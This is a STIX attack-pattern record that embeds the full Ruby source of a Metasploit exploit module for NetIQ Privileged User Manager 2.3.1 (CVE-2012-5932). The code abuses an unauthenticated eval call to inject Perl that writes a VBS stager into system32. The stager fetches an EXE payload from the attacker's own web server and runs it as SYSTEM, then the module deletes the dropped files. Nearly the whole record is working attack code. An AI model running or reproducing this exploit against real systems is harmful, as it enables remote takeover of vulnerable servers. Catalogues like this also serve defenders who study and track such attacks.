{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--be4da10f-f80f-44a8-96f9-752a321c2903",
    "created": "2024-08-14T16:38:45.238252Z",
    "modified": "2024-08-14T16:38:45.238257Z",
    "name": "NetIQ Privileged User Manager 2.3.1 ldapagnt_eval() Remote Perl Code Execution",
    "description": " This module abuses a lack of authorization in the NetIQ Privileged User Manager service (unifid.exe) to execute arbitrary perl code. The problem exists in the ldapagnt module. The module has been tested successfully on NetIQ PUM 2.3.1 over Windows 2003 SP2, which allows to execute arbitrary code with SYSTEM privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/novell/netiq_pum_eval.rb",
            "external_id": "netiq_pum_eval.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5932"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NetIQ Privileged User Manager 2.3.1 ldapagnt_eval() Remote Perl Code Execution',\n        'Description' => %q{\n          This module abuses a lack of authorization in the NetIQ Privileged User Manager\n          service (unifid.exe) to execute arbitrary perl code. The problem exists in the\n          ldapagnt module. The module has been tested successfully on NetIQ PUM 2.3.1 over\n          Windows 2003 SP2, which allows to execute arbitrary code with SYSTEM privileges.\n        },\n        'Author' => [\n          'rgod', # Vulnerability discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2012-5932' ],\n          [ 'OSVDB', '87334' ],\n          [ 'BID', '56539' ],\n          [ 'EDB', '22738' ]\n        ],\n        'Payload' => {\n          'Space' => 2048,\n          'StackAdjustment' => -3500\n        },\n        'Platform' => 'win',\n        'Privileged' => true,\n        'Targets' => [\n          ['Windows 2003 SP2 / NetIQ Privileged User Manager 2.3.1', {}],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-11-15',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the VBS payload request', 60])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    data = fake_login\n\n    print_status(\"Sending fake login request...\")\n\n    res = send_request_cgi(\n      {\n        'uri' => '/',\n        'version' => '1.1',\n        'method' => 'POST',\n        'ctype' => \"application/x-amf\",\n        'headers' => {\n          \"x-flash-version\" => \"11,4,402,278\"\n        },\n        'data' => data,\n      }\n    )\n\n    if res and res.body =~ /onResult/ and res.body =~ /Invalid user name or password/ and res.body =~ /2\\.3\\.1/\n      return Exploit::CheckCode::Appears\n    elsif res and res.body =~ /onResult/ and res.body =~ /Invalid user name or password/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def on_new_session(session)\n    if session.type == \"meterpreter\"\n      session.core.use(\"stdapi\") unless session.ext.aliases.include?(\"stdapi\")\n    end\n\n    @dropped_files.delete_if do |file|\n      win_file = file.gsub(\"/\", \"\\\\\\\\\")\n      if session.type == \"meterpreter\"\n        begin\n          windir = session.sys.config.getenv('WINDIR')\n          win_file = \"#{windir}\\\\system32\\\\#{win_file}\"\n          # Meterpreter should do this automatically as part of\n          # fs.file.rm().  Until that has been implemented, remove the\n          # read-only flag with a command.\n          session.shell_command_token(%Q|attrib.exe -r \"#{win_file}\"|)\n          session.fs.file.rm(win_file)\n          print_good(\"Deleted #{file}\")\n          true\n        rescue ::Rex::Post::Meterpreter::RequestError\n          false\n        end\n\n      end\n    end\n  end\n\n  # Handle incoming requests from the target\n  def on_request_uri(cli, request)\n    vprint_status(\"on_request_uri called\")\n\n    if (not @exe_data)\n      print_error(\"A request came in, but the EXE archive wasn't ready yet!\")\n      return\n    end\n\n    print_good(\"Sending the EXE payload to the target...\")\n    send_response(cli, @exe_data)\n    @exe_sent = true\n  end\n\n  def lookup_lhost()\n    # Get the source address\n    if datastore['SRVHOST'] == '0.0.0.0'\n      Rex::Socket.source_address('50.50.50.50')\n    else\n      datastore['SRVHOST']\n    end\n  end\n\n  def fake_login\n    data = \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x15\\x53\\x50\\x46\\x2e\\x55\\x74\"          #  ..........SPF.Ut\n    data << \"\\x69\\x6c\\x2e\\x63\\x61\\x6c\\x6c\\x4d\\x6f\\x64\\x75\\x6c\\x65\\x45\\x78\\x00\" #  il.callModuleEx.\n    data << \"\\x02\\x2f\\x34\\x00\\x00\\x00\\x64\\x0a\\x00\\x00\\x00\\x01\\x03\\x00\\x03\\x70\" #  ./4...d........p\n    data << \"\\x6b\\x74\\x03\\x00\\x0b\\x43\\x72\\x65\\x64\\x65\\x6e\\x74\\x69\\x61\\x6c\\x73\" #  kt...Credentials\n    data << \"\\x03\\x00\\x04\\x6e\\x61\\x6d\\x65\\x02\\x00\\x04\\x74\\x65\\x73\\x74\\x00\\x06\" #  ...name...test..\n    data << \"\\x70\\x61\\x73\\x73\\x77\\x64\\x02\\x00\\x04\\x74\\x65\\x73\\x74\\x00\\x00\\x09\" #  passwd...test...\n    data << \"\\x00\\x06\\x6d\\x65\\x74\\x68\\x6f\\x64\\x02\\x00\\x05\\x6c\\x6f\\x67\\x69\\x6e\" #  ..method...login\n    data << \"\\x00\\x06\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x02\\x00\\x04\\x61\\x75\\x74\\x68\\x00\" #  ..module...auth.\n    data << \"\\x03\\x75\\x69\\x64\\x06\\x00\\x00\\x09\\x00\\x00\\x09\";                    #  .uid.......\n    return data\n  end\n\n  def exploit\n    data = fake_login\n\n    print_status(\"Sending fake login request...\")\n    res = send_request_cgi(\n      {\n        'uri' => '/',\n        'version' => '1.1',\n        'method' => 'POST',\n        'ctype' => \"application/x-amf\",\n        'headers' => {\n          \"x-flash-version\" => \"11,4,402,278\"\n        },\n        'data' => data,\n      }\n    )\n\n    if not res or res.code != 200 or res.body !~ /svc(.+)/\n      fail_with(Failure::Unknown, 'Fake Login failed, svc not identified')\n    end\n\n    svc = $1\n    svc_length = svc[1, 2].unpack(\"n\")[0]\n    svc_name = svc[3, svc_length]\n    vprint_status(\"SVC Found: #{svc_name}\")\n\n    print_status(\"Generating the EXE Payload...\")\n    @exe_data = generate_payload_exe\n    exename = Rex::Text.rand_text_alpha(1 + rand(2))\n\n    print_status(\"Setting up the Web Service...\")\n    datastore['SSL'] = false\n    resource_uri = '/' + exename + '.exe'\n    service_url = \"http://#{lookup_lhost}:#{datastore['SRVPORT']}#{resource_uri}\"\n    print_status(\"Starting up our web service on #{service_url} ...\")\n    start_service({\n      'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }\n    })\n    datastore['SSL'] = true\n\n    # http://scriptjunkie1.wordpress.com/2010/09/27/command-stagers-in-windows/\n    vbs_stage = Rex::Text.rand_text_alpha(3 + rand(5))\n    code = \"system(\\\"echo Set F=CreateObject(\\\\\\\"Microsoft.XMLHTTP\\\\\\\") >%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"echo F.Open \\\\\\\"GET\\\\\\\",\\\\\\\"#{service_url}\\\\\\\",False >>%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"echo F.Send >>%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"echo Set IA=CreateObject(\\\\\\\"ADODB.Stream\\\\\\\") >>%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"echo IA.Type=1 >>%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"echo IA.Open >>%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"echo IA.Write F.responseBody >>%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"echo IA.SaveToFile \\\\\\\"%WINDIR%\\\\system32\\\\#{exename}.exe\\\\\\\",2 >>%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"echo CreateObject(\\\\\\\"WScript.Shell\\\\\\\").Run \\\\\\\"%WINDIR%\\\\system32\\\\#{exename}.exe\\\\\\\" >>%WINDIR%/system32/#{vbs_stage}.vbs\\\");\"\n    code << \"system(\\\"#{vbs_stage}.vbs\\\");\"\n    register_file_for_cleanup(\"#{vbs_stage}.vbs\")\n    register_file_for_cleanup(\"#{exename}.exe\")\n    identity = \"\"\n\n    data = \"\\x00\\x00\\x00\\x00\\x00\\x01\"\n    data << \"\\x00\\x14\"\n    data << \"SPF.Util.callModuleA\"\n    data << \"\\x00\\x00\"\n    data << \"\\x00\"\n    data << \"\\x00\\x02\"\n    data << \"\\x0a\\x0a\"\n    data << \"\\x00\\x00\\x00\\x01\\x03\"\n    data << \"\\x00\\x03\"\n    data << \"pkt\"\n    data << \"\\x03\"\n    data << \"\\x00\\x06\"\n    data << \"method\"\n    data << \"\\x02\"\n    data << \"\\x00\\x04\"\n    data << \"eval\"\n    data << \"\\x00\\x06\"\n    data << \"module\"\n    data << \"\\x02\"\n    data << \"\\x00\\x08\"\n    data << \"ldapagnt\"\n    data << \"\\x00\\x04\"\n    data << \"Eval\"\n    data << \"\\x03\"\n    data << \"\\x00\\x07\"\n    data << \"content\"\n    data << \"\\x02\"\n    data << [code.length + 4].pack(\"n\")\n    data << code\n    data << \"\\x0a\\x0a1;\\x0a\\x0a1;\"\n    data << \"\\x00\\x00\\x09\"\n    data << \"\\x00\\x00\\x09\"\n    data << \"\\x00\\x03\"\n    data << \"uid\"\n    data << \"\\x02\"\n    data << [identity.length].pack(\"n\")\n    data << identity\n    data << \"\\x00\\x00\\x09\"\n    data << \"\\x00\\x08\"\n    data << \"svc_name\"\n    data << \"\\x02\"\n    data << [svc_name.length].pack(\"n\")\n    data << svc_name\n    data << \"\\x00\\x00\\x09\"\n\n    print_status(\"Sending the eval code request...\")\n\n    res = send_request_cgi(\n      {\n        'uri' => '/',\n        'version' => '1.1',\n        'method' => 'POST',\n        'ctype' => \"application/x-amf\",\n        'headers' => {\n          \"x-flash-version\" => \"11,4,402,278\"\n        },\n        'data' => data,\n      }\n    )\n\n    if res\n      fail_with(Failure::Unknown, \"There was an unexpected response to the code eval request\")\n    else\n      print_good(\"There wasn't a response, but this is the expected behavior...\")\n    end\n\n    # wait for the data to be sent\n    print_status(\"Waiting for the victim to request the EXE payload...\")\n\n    waited = 0\n    while (not @exe_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"Target didn't request request the EXE payload -- Maybe it cant connect back to us?\")\n      end\n    end\n\n    print_status(\"Giving time to the payload to execute...\")\n    select(nil, nil, nil, 20)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-15",
    "x_mitre_platforms": [
        "win'"
    ]
}